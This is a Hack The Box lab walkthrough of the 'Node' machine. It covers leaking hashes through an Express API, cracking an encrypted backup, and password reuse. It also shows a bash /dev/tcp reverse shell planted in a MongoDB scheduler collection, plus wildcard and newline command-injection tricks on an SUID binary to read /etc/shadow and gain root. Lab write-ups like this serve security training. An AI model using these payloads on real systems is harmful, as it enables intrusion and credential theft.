---
title : "Hack The Box - Node"
author: Bhaskar Pal
date: 2022-03-21 11:33:00 +0800
categories: [Hackthebox, Hackthebox-Linux, Hackthebox-Medium]
tags: [nmap,nodejs,crackstation,source-code,password-reuse,bof,command-injection,wildcard,reverse-engineering,binaryninja,OSCP]
---

![image](https://user-images.githubusercontent.com/59029171/139866885-bc8556d4-7979-4d42-9d4e-027c0900f245.png)

**Node is about enumerating an Express NodeJS application to find an API endpoint that discloses the usernames and password hashes. To root the box is a simple buffer overflow and possible by three other unintended ways.**

---

# Recon
## Nmap

The first thing that I do is run nmap scan that show this results:
```console
0xStarlight@kali$ nmap -sC -sV -Pn 10.10.10.58 -vv > nmap_scan.conf
0xStarlight@kali$ cat nmap_scan.conf
PORT     STATE SERVICE            REASON  VERSION
# 22/tcp   open  ssh                syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmEgVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRnw28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEVL5tYGb
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU=
|   256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y
# 3000/tcp open  hadoop-tasktracker syn-ack Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: MyPlace
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
From the nmap results, we can see that there is port 3000 which is a web service that running on the server and on port 22 is SSH.

## Website - TCP 3000

First of all, we can add the IP to our `/etc/host` folder as `node.htb`

```shell
0xStarlight@kali$ sudo nano /etc/host
10.10.10.58 node.htb
```

Upon visiting the site, it looks like a typical social media site. It has a signup page which is currently closed, and a login page.

![image](https://user-images.githubusercontent.com/59029171/139860231-50796fb7-ea89-4232-8ee1-90288d34bae4.png)

I tried using some common usernames and passwords to log in, but none of them succeeded. Since it uses NodeJS, there's a good chance the backend is using MongoDB. I tried some basic NoSQL injections but got no luck.
I then tried feroxbuster, but that resulted in the URL redirecting all the pages to the main home page.

So none of those helped me anyhow.

## Cracking Hashes

Let us refresh the page, check the network tab, look through all the `*.js` files, and check if we find any interesting files.

![image](https://user-images.githubusercontent.com/59029171/139860894-9ad9e053-de44-447e-893a-588c996d5068.png)

I found an interesting `js` file that makes a GET request to another `js` file to pull down all the profiles.
```
GET /assets/js/app/controllers/profile.js HTTP/1.1
Host: node.htb:3000
Connection: keep-alive
[SNIP...]
```
Let us look at the source code of the `js` file. 

![image](https://user-images.githubusercontent.com/59029171/139861382-e3eba5ba-05c9-49db-845d-784529cc4337.png)

It is making a GET API request to `/api/users` seems to pull down the username parameter

Upon visiting the endpoint, we can see that it contains all the user's IDs, usernames and hashes, which will allow us to log in to the webpage.

![image](https://user-images.githubusercontent.com/59029171/139861694-1d9cd712-0bff-44ec-81dc-342d943a052a.png)

We can grab the hashes and try cracking them on [crackstation](https://crackstation.net/) to get the passwords in plain text.

![image](https://user-images.githubusercontent.com/59029171/139862166-b0059627-528a-456a-a2be-c5149767a0fa.png)

Great now we have the username and passwords in plain text.
Let's login on to the web page as `myP14ceAdm1nAcc0uNT` as it has admin privileges.

![image](https://user-images.githubusercontent.com/59029171/139862329-c026f889-1b47-464e-9b74-60e89ed32cdb.png)

# Shell as Mark

## myplace.backup 

After Logging in, there was an option to download a backup file. We can download the file on our local machine and start to analyze it. 

We can try checking the file type first.
```shell
0xStarlight@kali$ file myplace.backup           
myplace.backup: ASCII text, with very long lines, with no line terminators
```

It says ASCII text. Let us read the content of the file.

```bash
0xStarlight@kali$ cat myplace.backup                                            

UEsDBAoAAAAAAHtvI0sAAAAAAAAAAAAAAAAQABwAdmFyL3d3dy9teXBsYWNlL1VUCQADyfyrWXrgd2F1eAsAAQQAAAAABAAAAABQSwMEFAAJAAgARQEiS0x97zc0EQAAEFMAACEAHAB2YXIvd3d3L215cGxhY2UvcGFja2FnZS1sb2NrLmpzb25VVAkAA9HoqVlL/8pZdXgLAAEEAAAAAAQAAAAAynsHjHtvHInyMHK96c66FXUMDUOwEAWe+Am9h6156G33NE/wuxHi0dnBAx8vweFPkPqZtCDL3hM4F+eobU5Cerzkqznx9Fu1mCWfZFHymBPNt+ihMv+mlQbBfTJ6VQrUVmgoxcEt51mXSx5sWQ/92wOT0aZs1cxrWnlpfAS+mRr/a8HjU8ZqF6XiEhR9EIaLPeuXGFRaB7o9mT0/YvtfL1zSnzme5kdmQhquEV/4Zxo4lJv5JTbxPJeC
[SNIP...]
```

It seems like base64 encoded ASCII text.
We can pipe the file content as base64, store it into another file, and recheck the file type.

```bash
0xStarlight@kali$ cat myplace.backup | base64 -d > unknown_file

0xStarlight@kali$ file unknown_file  
unknown_file: Zip archive data, at least v1.0 to extract
```
It results in a Zip archive data file. When trying to unzip, it requires a password. We can crack the password by `fcrackzip` using `rockyou.txt` as the wordlist.

```shell
0xStarlight@kali$ fcrackzip -u -D -p /home/kali/rockyou.txt unknown_file 

PASSWORD FOUND!!!!: pw == magicword
```

Lets unzip the file and check the archived content

```bash
0xStarlight@kali$ ls                                                                                 
app.html  app.js  node_modules  package.json  package-lock.json  static
```

After reading the content in `app.js` we can get the credentials to connect to MongoDB on localhost to myspace process.

```bash
0xStarlight@kali$ batcat app.js
```

![image](https://user-images.githubusercontent.com/59029171/139862818-fb924da2-aa05-4121-9253-1b0c5a6f9157.png)

> mark:5AYRft[SNIP...]
{: .prompt-info }

## SSH as Mark

Let us try to logon as SSH as Mark with the same password we found from the `app.js` file.
Maybe password reuse?
```bash
0xStarlight@kali$ ssh mark@10.10.10.58
```
Great we logged on !

![image](https://user-images.githubusercontent.com/59029171/139863122-bc3f27d6-99db-4c26-8b8d-6dcec8fffc90.png)

# Shell as Tom

We found MongoDB running on Mark's machine from the downloaded backup file. We check if any node services are running on the machine and try to connect it as Mark.
```bash
mark@node:/home$ ps aux | grep node
tom       1230  0.0  5.3 1008056 40400 ?       Ssl  18:55   0:01 /usr/bin/node /var/scheduler/app.js
tom       1234  0.0  5.6 1019880 42936 ?       Ssl  18:55   0:01 /usr/bin/node /var/www/myplace/app.js
mark      1541  0.0  0.1  14228   940 pts/0    S+   19:37   0:00 grep --color=auto node
```
It looks like Tom has the same file running on a different process
Let's read the content from `/var/scheduler/app.js` file.

![image](https://user-images.githubusercontent.com/59029171/139863489-c429d69d-6db0-4249-b1bb-07cdc630f992.png)

It looks like it creates a DB collection named task.
It takes an input parameter as cmd on line 18 and executes it, and then deletes it after the execution is done.
So now we can privilege escalation by injecting a reverse shell in the cmd parameter.
Let us try to connect to mongo DB as Mark using the scheduler process.

```bash
mark@node:/home$ mongo -u mark -p 5AYRft73VtFpc84k scheduler
```
![image](https://user-images.githubusercontent.com/59029171/139863624-5789a510-bdfb-4e4b-bb95-680dd04936ec.png)

It seems like the DB is empty after querying the data collections.

```shell
> show collections
tasks
> db.tasks.find()
> 
> db.task.count()
0
```
Let us add an object in the tasks collections with a cmd parameter containing a reverse shell that will connect back to Tom since the scheduler process is running as Tom.

```shell
> db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.17/9999 0>&1'"})
WriteResult({ "nInserted" : 1 })
>
```

We got a shell as Tom !

![image](https://user-images.githubusercontent.com/59029171/139863804-ab5cca2b-f3cc-47c7-943c-442ed7ac3a68.png)

## backup SUID

Let us check the SUID privileges for Tom user and search for any interesting files.

```bash
tom@node:/home$ find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```
![image](https://user-images.githubusercontent.com/59029171/139863921-f67a465f-7c0d-4a64-92ff-b03d4aaa85cc.png)

I found an interesting file `backup`, with file permissions as `admin` to execute.
We can execute the file since we have GUID as `admin` as Tom.
On executing the file, it doesn't return anything.

```bash
tom@node:/$ /usr/local/bin/backup
```
I do remember that there was a process that spawns backup on `api.js` whcih we found earlier.
Let's read that and see what it does.

```bash
var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
```

![image](https://user-images.githubusercontent.com/59029171/139864170-23104d87-26b9-4b6e-ae26-84d2a6f726cb.png)

It takes three parameters: `-q`, then a backup key and a directory name.
Let us run the file using `strace` to check what's happening.

```bash
tom@node:/$ strace /usr/local/bin/backup a a a
```
At the end of the file we can notice its trying read the content of `"/etc/myplace/keys"` file.
```shell
[SNIP...]

) = 81
write(1, "\n", 1
)                       = 1
open("/etc/myplace/keys", O_RDONLY)     = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=196, ...}) = 0
read(3, "a01a6aa5aaf1d7729f35c8278daae30f"..., 4096) = 196
read(3, "", 4096)                       = 0
write(1, " \33[33m[!]\33[37m Ah-ah-ah! You did"..., 57 [!] Ah-ah-ah! You didn't say the magic word!

) = 57
[SNIP...]
```
After reading the file's content, We can figure that it contains some keys. Maybe we can use these keys and read the root directory?

```bash
tom@node:/$ cat /etc/myplace/keys
a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
```

# Shell as Root

## Read Flag only [ Path I ]

Since now we have the keys and know how it works, let us try to read the root directory folder.

```shell
tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /root
```

![image](https://user-images.githubusercontent.com/59029171/139864597-4bcd48c8-fc94-4ed5-adb2-3e701b47c330.png)

Let us transfer the output to our local machine and analyze it. It looks like base64, and piping it out to a file and analyzing it tells it is a zip file. We can use the same password as last time to crack the zip and read the data.

```bash
0xStarlight@kali$ cat unknown | base64 -d > unknown.zip
0xStarlight@kali$ unzip unknown.zip
```
After extracting the file it gives us `root.txt`
Let us read the content of the file.

```bash
0xStarlight@kali$ cat root.txt
```
Its a troll ! :( I guess its not that easy

![image](https://user-images.githubusercontent.com/59029171/139864757-cbf9c254-6bc3-4f3c-a1df-c6cbd6dc9df5.png)

Let us try it out again without `/` in `/root` while entering the parameter. I am just guessing and checking the result.

```shell
tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 root
```
It has way more output this time.
Let us do the same steps as before, extract the file and then read the file's contents.

```bash
0xStarlight@kali$ unzip decode.zip 
Archive:  decode1.zip
   creating: root/
[decode1.zip] root/.profile password: 
  inflating: root/.profile           
  inflating: root/.bash_history      
   creating: root/.cache/
 extracting: root/.cache/motd.legal-displayed  
 extracting: root/root.txt           
  inflating: root/.bashrc            
  inflating: root/.viminfo           
   creating: root/.nano/
 extracting: root/.nano/search_history 
```
It looks like we have root.txt 🥳.
But it's not over yet. We don't have a shell.

## Wild Characters [ Path - II ]

Let's transfer this file over to our local host machine and analyze the file on binaryninja.
Open the main function in the disassembly Graph view.

![image](https://user-images.githubusercontent.com/59029171/139865028-4e57ef7f-e6b2-455d-b674-e867e17204f4.png)

After scrolling down, we can see that it has `/root` as a bad character, resulting in the troll ASCII Art.

![image](https://user-images.githubusercontent.com/59029171/139865161-f33b7c18-c33b-4262-bcd6-532d7458f508.png)

![image](https://user-images.githubusercontent.com/59029171/139865264-f5fb86e5-8cc5-4beb-8323-14412bbcd011.png)

Further Scrolling down, we can get a list of all the bad chars that it doesn't allow.

1. `..`

![image](https://user-images.githubusercontent.com/59029171/139865415-a46ae779-2cec-40b4-adef-ec3d18a3bd8f.png)

![image](https://user-images.githubusercontent.com/59029171/139865468-55fbf2c1-d2a9-4888-95b2-7765e99029d5.png)

And if we go on doing this, we will find all the bad characters.

```shell
Bad chars : .. /root ; & ` $ | /etc // / etc
```
Looking at our bad chars list, we don't have the `*` nor `~` sign.
We can use this to bypass and read the `/root` directories files and content.
For example, if we do the following command on our local machine.

```shell
$ cd ~
$ cd r**t
$ cd r??t
```
We will be returned to our home directory since there is no other directory it can get returned to.
Hence we can read the root flag this way.
Let us try it out.

```shell
tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /r**t/roo*.txt
```
This gives us the `root.txt` file content.

![image](https://user-images.githubusercontent.com/59029171/139865761-c97250ba-3fd6-4f91-bb82-9d27ee9b8716.png)

We can do the same steps as privilege escalation 1 to extract the file and retrieve the flag.
We can also try to read the `/etc/passwd` file and then try to crack it, then SSH as root on the machine.

```shell
tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 "/e*c/shado*" ; echo
```
![image](https://user-images.githubusercontent.com/59029171/139865901-ca96a5cf-d659-40ed-9cba-9387b0964570.png)

Extract the file by the same methods above, and then we can read the shadow file root hashes.

![image](https://user-images.githubusercontent.com/59029171/139865997-1d77c5fb-f166-425a-93ac-aa29f49f95c1.png)

## Command Injection [ Path-III ]

Open the main function in the disassembly Graph view.
Scroll down to the part where it executes the zip command if the parameters are correct.

![image](https://user-images.githubusercontent.com/59029171/139866091-6696b9e0-322d-4649-9c32-cb67cb1fb416.png)

Here we can see it has the exec command for zipping the data, and below that, we can also see that it calls the system; which means we might be able to do command injection on the third parameter with the help of a new line and get root and it is not a bad char as well.
Now let us find out how we can do the command injection.

Open the main function in ELF Linear View.
We can see a command which gets executed if we enter the correct magic word. It will zip the file content in base64 and display it to us on the screen.

```shell
"/usr/bin/zip -r -P magicword %s %s > /dev/null"
```
![image](https://user-images.githubusercontent.com/59029171/139866253-4e69b27b-cf7f-40e7-b3c7-7b67ce5fd4c7.png)

As per the command, we can see it takes the last argument and pushes it to `/dev/null`. Hence, the command won't execute it.
So we can try to execute `/bin/bash` and get a root shell!
We can do the command injection something like this.

```
"randomblahbla
/bin/bash
randomblahba"
```
We can't do command injection in the first parameter since it has a bad char check for `/` but not for the chars on a new line, and we can't put it at the end as it will get flushed out to `/dev/null`.

Lets try it out

![image](https://user-images.githubusercontent.com/59029171/139866414-beaadd82-b2df-4113-a707-3b580d6d95c8.png)

WE ARE ROOT !!

## BOF [ Path - IV ]

A really good blog is written for this method of priv esc
[https://rastating.github.io/hackthebox-node-walkthrough/](https://rastating.github.io/hackthebox-node-walkthrough/)

# Box Rooted 

![image](https://user-images.githubusercontent.com/59029171/139872271-6a94a1ef-8c16-4b60-9ce9-0405305b0257.png)

HTB Profile : [0xStarlight](https://app.hackthebox.com/profile/244565)

If you find my articles interesting, you can buy me a coffee 

<a href="https://www.buymeacoffee.com/0xStarlight"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&emoji=&slug=0xStarlight&button_colour=b86e19&font_colour=ffffff&font_family=Poppins&outline_colour=ffffff&coffee_colour=FFDD00" /></a>
